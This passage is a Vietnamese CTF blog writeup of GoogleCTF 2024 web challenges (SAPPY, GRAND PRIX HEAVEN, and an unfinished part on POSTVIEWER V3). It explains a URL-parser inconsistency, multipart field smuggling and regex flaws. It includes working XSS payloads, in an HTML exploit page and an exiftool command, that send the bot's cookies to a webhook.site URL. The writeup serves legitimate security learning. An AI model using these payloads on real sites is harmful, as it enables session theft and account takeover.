---
title: "GoogleCTF 2024"
description: "GoogleCTF writeups"
summary: "Here is the GoogleCTF writeups"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2024-06-25
draft: true
authors:
  - Shin24
---

Cuối tuần vừa rồi, mình có chơi CTF với CoSGang a.k.a Council of Sheep và đạt được thứ hạng **#28**

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6d5221d6-763b-424a-892c-636727557efe)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7627fe64-f9e1-4d77-ba65-9bae8ce38e52)

Đây sẽ là writeup của mình về những bài đã giải được (3 bài đầu) và cả những bài mình ngồi giải lại sau giải (2 bài sau), hi vọng nó sẽ giúp ích cho các bạn.

## SAPPY

Ở bài này ta thấy tính năng của web là khi ta click vào 1 trong 4 nút bấm thì sẽ có 1 iframe xuất hiện để hiển thị output tương ứng với từng nút

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ce790035-de14-4171-a8eb-cb77927bd86c)

Trong file `sap.html` thì nội dung quan trọng sẽ ở trong đoạn sau:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/558d5711-afd5-4b30-9d47-d7ea535b3fb3)

Trong file `sap.js` sẽ có một message handler

```js
window.addEventListener(
  "message",
  async (event) => {
    let data = event.data;
    if (typeof data !== "string") return;
    data = JSON.parse(data);
    const method = data.method;
    switch (method) {
      case "initialize": {
        if (!data.host) return;
        API.host = data.host;
        break;
      }
      case "render": {
        if (typeof data.page !== "string") return;
        const url = buildUrl({
          host: API.host,
          page: data.page,
        });
        const resp = await fetch(url);
        if (resp.status !== 200) {
          console.error("something went wrong");
          return;
        }
        const json = await resp.json();
        if (typeof json.html === "string") {
          output.innerHTML = json.html;
        }
        break;
      }
    }
  },
  false
);
```

Rất nhanh chóng ta xác định được một sink quen thuộc đó là `innerHTML`:

```js
output.innerHTML = json.html;
```

để chạm được nhánh `case` này ta sẽ cần postMessage một đoạn JSON với thuộc tính `method` là `render`, trước đó ta cũng cần control được `API.host` (thông qua method `initialize`) để làm web fetch payload của ta về và gán cho `innerHTML`. 

Trước đó thì ta sẽ cần bypass được `validate` được gọi khi ta cố gắng trigger `render` nhằm kiểm tra xem domain có phải là `sappy-web.2024.ctfcompetition.com` không

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/72d63809-59f6-4a67-ae36-692b69060efd)

Ta thấy được rằng trước khi gọi `validate` thì url sẽ được parse bằng `goog.Uri.parse`, ta cần hiểu cách mà hàm này hoạt động

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/20447bdd-d404-4783-b23e-93fe103aa90c)

Vào phần source của devtools để kiểm tra, ta tìm được phần khai báo constructor của object Uri

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8f00a3c7-f5cd-4dc9-8cd6-49abc09eb668)

`goog.uri.utils.split` được gọi với tham số là `a` (`a` là url truyền vào ban đầu), ta thử xem cách `goog.uri.utils.split` hoạt động

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/1de272e3-8c9f-4ec3-b828-cc388498077e)

```
goog.uri.utils.splitRe_ = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");
```

Vậy là url được xử lý dựa trên regex, rất nhanh ta sẽ thấy được vấn đề là phần protocol của URL không có ràng buộc phải là `http` hay `https`, ngay từ đầu việc parse URL bằng một đoạn regex thế này theo mình nghĩ đã là vấn đề, lấy ví dụ `https://google.com` thì hostname của nó là google.com, thế còn `file:///etc/passwd` thì hostname của nó là gì? Tới đây thì mình chợt nghĩ nếu như ta fetch đến `data:://sappy-web.2024.ctfcompetition.com` thì sẽ thế nào, vì cú pháp của một URL với protocol là `data://` sẽ là `data:[<mediatype>][;base64],<data>`, vậy ta có thể biến phần domain `sappy-web.2024.ctfcompetition.com` thành `mediatype` và khi fetch đến nó sẽ trả về response là `<data>`, đây là vấn đề parser inconsistency giữa `goog.URI` và browser

```html
<html>
    <iframe></iframe>
    <script>
        const ifrm = document.querySelector("iframe");

        ifrm.src="https://sappy-web.2024.ctfcompetition.com/sap.html"
        ifrm.addEventListener("load", function() {
            ifrm.contentWindow.postMessage(
                JSON.stringify({
                    "method": "initialize", 
                    "host": "data://sappy-web.2024.ctfcompetition.com/"
                }), "https://sappy-web.2024.ctfcompetition.com"
            );

            ifrm.contentWindow.postMessage(
                JSON.stringify({
                    "method": "render",
                    "page": ',{"html":"<img src=x onerror=\\"a = window.open(`https://sappy-web.2024.ctfcompetition.com/`); window.location=`https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c=${a.document.cookie}`\\" />"}'
                }), "https://sappy-web.2024.ctfcompetition.com"
            );
        })

    </script>
</html>
```

Đầu tiên ta sẽ thực hiện iframe và `postMessage` đến `sap.html` sau đó set `API.host` về `data://sappy-web.2024.ctfcompetition.com/`, rồi sau đó ở `page` trong đoạn JSON ở postMessage thứ 2 ta sẽ để payload XSS vào đó, khi gọi `fetch` lên URL này thì response trả về sẽ là đoạn JSON mà ta cài vào

## GRAND PRIX HEAVEN

Bài này thì có dính server side một chút nhưng concept cũng là client side

### TL;DR
Lợi dụng cách parse multipart/form-data của server để smuggle một field `mediaparser` vào, `mediaparser` tồn tại một sink XSS là innerHTML, ta sẽ lợi dụng một lỗi trong câu regex để bắt nó load đến media có chứa XSS payload trong exifdata và lấy flag trong cookie của bot

### Writeup

Challenge gồm 2 server với heaven_server có nhiệm vụ như một proxy thực hiện các tiền xử lý trước khi forward đến `template_server` để render nên page bằng các template có sẵn

Đầu tiên thì ta sẽ thấy sink XSS trong file `mediaparser.js`, nhưng không như `apiparser.js` thì `heaven_server` sẽ không có phép ta load `mediaparser.js` vào và cũng như bắt buộc ta phải include CSP vào trước khi tạo faves

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/83b9cd21-c5b5-4d0c-b472-42f9b4828a4e)

Ở phần CSP thì khá dễ bypass, thay vì array thì ta sẽ gửi một object với các key là các số theo dạng `{"1":"aaaa", ...}` để né index 0, để include được `mediaparser.js` thì ta sẽ nhìn vào cách mà template_server parse multipart/form-data

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/1ff4cd06-6603-4190-bf41-0f655bf7da49)

Ta thấy server dùng `\r\n\r\n` làm delimiter để split data thành một mảng và check xem mảng đó có template key (như csp, faves, retrieve, mediaparser, ...) không, nếu có thì nó sẽ include phần HTML tương ứng của template key đó vào response

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cb30161e-5ed8-45ee-bba8-1510c79891ca)

Vậy nếu trong key mà ta gửi lên server có dạng `6\r\n\r\nmediaparser\r\n\r\n` thì sao? Lúc này ở heaven_server nó sẽ đi qua `parseInt` và trả về giá trị 6, hợp lệ, khi đến server thì được split ra thành một mảng với delim là "\r\n\r\n", lúc này array sẽ có một phần tử là `mediaparser` vì nó nằm giữa 2 delim, lúc này đoạn `lines.includes(item)` sẽ đúng và nó sẽ include `mediaparser` vào. Xong 1 phase, ở phase 2 ta sẽ tìm cách để làm cho nó load một cái media ta vừa tạo

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f36a166a-d968-47a7-b1fe-c765fe47fea2)

Vấn đề ta gặp phải là constructor của `Requester` sẽ chặn một vài ký tự trong URL dẫn đến ta không thể truyền full URL vào được (ta cần fetch đến route `/media/:mediaId` chứ không phải `/api/get-car/:carId`), tuy nhiên thì phần check dùng regex

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7856dfc8-d856-496d-a349-20493cc62c8b)

Bạn có thấy điều bất thường ở đây không? Ta không thể đưa `\s` vào trong cặp dấu `[...]` được, lúc này nó sẽ hiểu là ký tự `\` và `s` chứ không phải space, vậy nghĩa là ta sẽ có thể dùng dấu `\` nữa, khi test thì mình nhận ra nếu ta gọi `new URL("\\", 'http://localhost:1337/api/get-car/');` thì lúc này URL sẽ thành `http://localhost:1337/`, nghĩa là base path đã bị override thành công, lúc này ta có thể truyền `\\media\\<media_id>` để mediaparser fetch đến media ta chuẩn bị sẵn, trước đó thì ta sẽ cài payload vào file jpg bằng exiftool

```
exiftool -ImageDescription='<img src=x onerror="window.location=`https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c=${document.cookie}`" />' Sample-jpg-image-50kb.jpg
```

Tạo fave:

```
POST /api/new-car HTTP/2
Host: grandprixheaven-web.2024.ctfcompetition.com
Content-Length: 52177
Cache-Control: max-age=0
Origin: http://localhost:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIxVOFGMKmjxYaR62
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:1337/new-fave
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="year"

2004
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="make"

Ferrari
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="model"

F2004
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="custom"

{
    "1": "retrieve",
    "2": "head_end",
    "3": "head_end",
    "4": "faves",
    "5": "footer",
		"6\r\n\r\nmediaparser\r\n\r\n": "apiparser"
}
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name="image"; filename="Sample-jpg-image-50kb.jpg"
Content-Type: image/jpeg

...
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ee0a2dc5-d7d6-4f13-aa4d-495265eb4f69)

Dùng endpoint get-car để lấy id của media vừa upload

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2f7deef7-1582-4e7a-b338-69324866f87c)

```
https://grandprixheaven-web.2024.ctfcompetition.com/fave/yn7TOo04qgNcr4n9TivPh?F1=\media\Q65ajKjHXfTm1MN0OS-yI
```

Report:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/fe1563a5-77e1-47bc-badb-643d971ac795)

## POSTVIEWER V3

Thật ra mình cũng không làm client side nhiều lắm, nhưng nói chung là mình cũng khá thích nó, bài này làm mình cũng hơi mất thời gian khi đi hết từ ý tưởng ngày đến ý tưởng khác + với việc method mình dùng là race condition nên phải ngồi spam bot cả tiếng nó mới hit...

Mình sẽ nói sơ ra về bài này một chút (mình sẽ cố gắng nói sơ về context ở mỗi bài nhưng hi vọng là các bạn đã có bung đề ra và xem trước rồi, mình muốn tập trung vào phân solving hơn là mấy cái râu ria). Đầu tiên thì đây là một "client-side file upload", web sẽ lưu file vào indexedDB, khi mở file thì nội dung file sẽ được render trong một "sandboxed origin" (`https://sbx-<hash>.postviewer3-web.2024.ctfcompetition.com`) thông qua iframe, bên trong iframe đó thì sẽ tiếp tục render nội dung của file thông qua một iframe trỏ đến blob URL

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9fcd8db2-f5c8-488c-b282-9f905e7690a7)

Goal của ta đó là con bot sẽ add một file chứa flag vào, ta cần lấy được nội dung của file đó somehow... Mình đã có đi qua nhiều ý tưởng nhưng chỉ có một idea là work nên mình sẽ trình bày về idea đó.

### safeFrameRender

Đầu tiên thì ta sẽ có một bug XSS rõ ràng trong sbx origin, thật ra đây là tính năng của web để giúp cho sbx origin có thể load nội dung tùy ý (nhằm sandbox nội dung tùy ý). Tuy nhiên XSS trên origin này thì gần như không có impact gì vì cookie nằm ở origin `https://postviewer3-web.2024.ctfcompetition.com`, ta cùng đi qua cách mà web sandbox file's content. `previewFile` sẽ được trigger, sau đó `previewFile` sẽ tiếp tục gọi `safeFrameRender`, `safeFrameRender` sẽ hoạt động như sau:
- Gọi `calculateHash` để tính ra hmac để bảo đảm với một content A sẽ chỉ khớp với 1 content A'
- Sau đó thực hiện tạo iframe tới file `shim.html` của origin vừa tạo 
- postMessage để gửi nội dung của sbx đi sau khi bên sbx origin callback về (nghĩa là khi sbx đã load xong)

Sau khi xong stage này thì nội dung của sbx origin sẽ là nội dung của `evaluatorHtml`

```html
<html>
  <head>
    <meta charset="utf-8">
    <title>Evaluator</title>

    <script>
      onmessage = e => {
        if(e.source !== parent) {
          throw /not parent/;
        };
        if(e.data.eval){
          eval(e.data.eval);
        }
      }
      onload = () => {
        parent.postMessage('loader ready','*');
      }
    </script>

    <style>
      body{
        padding: 0px;
        margin: 0px;
      }
      iframe{
        width: 100vw;
        height: 100vh;
        border: 0;
      }
      .spinner {
        background: url(https://storage.googleapis.com/gctf-postviewer/spinner.svg) center no-repeat;
      }
      .spinner iframe{
        opacity: 0.2
      }
    </style>
  </head>
  <body>
    <div id="container" class="spinner"></div>
  </body>
</html>
```

Lúc này chức năng của `shim.html` sẽ là nhận postMessage từ parent và eval data được gửi đến, bước này phục vụ cho việc parent sẽ gửi đến đoạn js lưu trong `iframeInserterHtml` để thực hiện đưa file's content vào bên trong iframe thông qua blob URL

```
const container = document.querySelector("#container");
container.textContent = '';
const iframe = document.createElement('iframe');
iframe.src = URL.createObjectURL(new Blob([e.data.body], {type: e.data.type}));
if(e.data.sandbox) {
  iframe.sandbox = e.data.sandbox;
}
container.appendChild(iframe);
setTimeout(()=>{
  container.classList.remove('spinner');
}, 5000);
iframe.onload = () => {
  setTimeout(()=>{
    container.classList.remove('spinner');
  }, 500);
};
```

Tới đây thì mình nghĩ, sẽ ra sao nếu mình dùng `const win = window.open("https://postviewer3-web.2024.ctfcompetition.com/#0")` để mở trang challenge với hash là `#0` để trigger mở file flag, sau đó `win.frames[0].postMessage(...)` để gửi postMessage đến sbx origin bên trong? Chắc chắn là fail, vì đoạn check `e.source !== parent`. Một lúc sau mình nảy ra thêm một ý khác, sẽ ra sao nếu ta có thể XSS được sbx origin, từ đó thực hiện `win = window.open("https://postviewer3-web.2024.ctfcompetition.com/#0")` và `win.frames[0].eval(...)` để XSS luôn iframe bên trong của challenge? Nếu thế thì ta cần thỏa mãn 1 điều kiện:
- Sbx origin mà ta XSS phải có cùng origin với sbx origin mà challenge mở (nghĩa là bọn nó phải cùng hash với nhau)

Tới đây mình nghĩ rằng có lẽ ta sẽ cần leak được origin của flag, nhưng không có manh mối gì cả... vậy thì control origin của flag luôn thì sao? 

### Race condition

Nhìn vào `safeFrameRender`:

```js
const hash = await calculateHash(body, product, window.origin, location.href);
```

Ở stage này thì body sẽ là `evaluatorHtml`, product là `postviewer`, window.origin là `https://postviewer3-web.2024.ctfcompetition.com`, chỉ có `location.href` là không biết được do phần hash của chứa file id của flag thì ta không biết, vì nếu trigger bằng hash `#0` thì tí nữa hash cũng sẽ bị replace thành file id của flag

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/99c29bb3-2372-4e3a-9fd2-f66f6966c49b)

